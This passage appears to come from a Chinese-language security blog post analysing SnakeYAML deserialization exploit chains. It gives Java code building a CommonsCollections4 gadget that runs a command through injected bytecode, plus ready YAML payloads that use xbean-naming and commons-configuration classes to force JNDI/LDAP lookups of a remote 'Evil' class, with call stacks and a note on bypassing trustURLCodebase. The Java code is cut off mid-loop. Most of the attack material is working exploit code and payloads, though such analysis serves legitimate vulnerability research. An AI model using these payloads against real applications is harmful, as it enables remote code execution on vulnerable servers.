##### WrapperConnectionPoolDataSource
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.yaml.snakeyaml.Yaml;
    import javax.xml.transform.Templates;
    import java.io.ByteArrayOutputStream;
    import java.io.InputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class Snakeyaml_CC4 {
        public static Field getField (final Class clazz, final String fieldName ) throws Exception {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                if ( field != null )
                    field.setAccessible(true);
                else if ( clazz.getSuperclass() != null )
                    field = getField(clazz.getSuperclass(), fieldName);
                return field;
            }
            catch ( NoSuchFieldException e ) {
                if ( !clazz.getSuperclass().equals(Object.class) ) {
                    return getField(clazz.getSuperclass(), fieldName);
                }
                throw e;
            }
        }
        public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static PriorityQueue CommonsCollections4() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass ctClass = pool.makeClass("c3p0Exploit");
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            String shell = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            ctClass.makeClassInitializer().insertBefore(shell);
            byte[] shellCode = ctClass.toBytecode();
            byte[][] targetCode = new byte[][]{shellCode};
            TemplatesImpl templatesImpl = new TemplatesImpl();
            setFieldValue(templatesImpl, "_name", "xxx");
            setFieldValue(templatesImpl, "_bytecodes", targetCode);
            setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(2);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(priorityQueue, transformingComparator);
            return priorityQueue;
        }
        public static byte[] toByteArray(InputStream in) throws Exception {
            byte[] classBytes;
            classBytes = new byte[in.available()];
            in.read(classBytes);
            in.close();
            return classBytes;
        }
        public static String bytesToHexString(byte[] bArray, int length) {
            StringBuffer sb = new StringBuffer(length);
            for(int i = 0; i 
              org.apache.xbean
              xbean-naming
              4.5
    !!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding ["foo",!!javax.naming.Reference ["foo", "Evil", "http://127.0.0.1/"],!!org.apache.xbean.naming.context.WritableContext []]]
这个利用链，在`BadAttributeValueExpException`类的构造方法中
如果传入的参数是`org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding`类对象，将会调用他的`toString`方法，虽然这个静态类没有`toString`方法，但是他的父类为`Binding`存在，在其中调用了`ReadOnlyBinding#getObject`方法，进而调用了`ReadOnlyBinding#resolve`,
在其中存在`NamingManager.getObjectInstance`，这个就是jndi利用链的一部分
跟进，在`NamingManager#getObjectInstance`调用了`getObjectFactoryFromReference`方法，跟进
首先使用当前的`ClassLoader`加载类，如果没有加载到，就通过获取`codebase`得到ClassLocation，之后通过loadClass获取恶意类，值得注意的是，在`loadClass`方法中将会判断是否开启`trustURLCodebase`，当然尽管他为`flase`，我们也可以通过寻找`ObjectFactory`绕过限制，后面的过程就很明白了
当然还有各种各样的和fastjson链结合的payload
##### org.apache.commons.configuration.ConfigurationMap
        commons-configuration
        commons-configuration
        1.10
    !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], "ldap://127.0.0.1:9999/Evil"]]: 1
调用栈
    getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
    getObjectInstance:189, DirectoryManager (javax.naming.spi)
    c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
    p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
    lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
    lookup:417, InitialContext (javax.naming)
    getBaseContext:452, JNDIConfiguration (org.apache.commons.configuration)
    getKeys:203, JNDIConfiguration (org.apache.commons.configuration)
    getKeys:182, JNDIConfiguration (org.apache.commons.configuration)
    :161, ConfigurationMap$ConfigurationSet$ConfigurationSetIterator (org.apache.commons.configuration)
    :154, ConfigurationMap$ConfigurationSet$ConfigurationSetIterator (org.apache.commons.configuration)
    iterator:207, ConfigurationMap$ConfigurationSet (org.apache.commons.configuration)
    hashCode:528, AbstractMap (java.util)
    constructMapping2ndStep:366, BaseConstructor (org.yaml.snakeyaml.constructor)
    constructMapping2ndStep:147, SafeConstructor (org.yaml.snakeyaml.constructor)
    constructMapping:354, BaseConstructor (org.yaml.snakeyaml.constructor)
    construct:489, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)
    constructObject:182, BaseConstructor (org.yaml.snakeyaml.constructor)
    constructDocument:141, BaseConstructor (org.yaml.snakeyaml.constructor)
    getSingleData:127, BaseConstructor (org.yaml.snakeyaml.constructor)
    loadFromReader:450, Yaml (org.yaml.snakeyaml)
    load:369, Yaml (org.yaml.snakeyaml)
在`constructMapping2ndStep`调用`AbstractMap#hashCode`方法，之后调用了`JNDIConfiguration#getKeys`在`getBaseContext`存在可控的`lookup`
## Reference